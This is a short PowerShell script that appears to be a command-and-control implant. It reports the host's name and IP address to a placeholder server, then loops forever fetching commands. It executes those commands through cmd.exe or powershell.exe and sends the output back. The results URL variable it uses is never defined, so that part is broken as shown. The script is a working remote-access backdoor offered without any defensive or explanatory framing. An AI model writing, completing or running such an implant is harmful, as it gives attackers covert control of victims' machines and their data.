$ip   = "REPLACE_IP"
$port = "REPLACE_PORT"
$n    = 3
$name = ""

$host_name = [System.Net.Dns]::GetHostName()
$type  = "PowerShell"
$remote_ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/agents")
$data  = @{
    name = "$host_name"
    type = "$type"
    remote_ip = "$remote_ip"
    }
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

for (;;){

    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content

    if (-Not [string]::IsNullOrEmpty($task)){

        $task = $task.split()
        $flag = $task[0]

        if ($flag -eq "VALID"){
            $command = $task[1]
            $args    = $task[2..$task.Length]

            if ($command -eq "shell"){
     		$res = & cmd.exe /c $args | Out-String
                $data = @{result = "$res"}

                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
            if ($command -eq "powershell"){
     		$res = & powershell.exe /c $args | Out-String
                $data = @{result = "$res"}

                Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
            }
	}
    sleep $n
    }
}
